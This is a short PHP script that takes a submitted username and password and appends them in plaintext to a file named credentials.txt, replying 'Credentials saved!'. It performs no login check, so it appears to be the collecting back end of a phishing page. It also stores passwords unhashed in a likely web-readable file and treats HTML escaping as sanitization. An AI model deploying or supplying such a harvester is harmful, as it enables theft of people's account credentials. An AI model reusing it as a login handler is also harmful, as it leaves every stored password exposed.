<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect and sanitize input
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Create a string with the username and password
    $data = "Username: $username, Password: $password\n";
    
    // Path to the file
    $file = 'credentials.txt';
    
    // Save to file
    file_put_contents($file, $data, FILE_APPEND);
    
    echo "Credentials saved!";
} else {
    echo "Invalid request method.";
}
?>
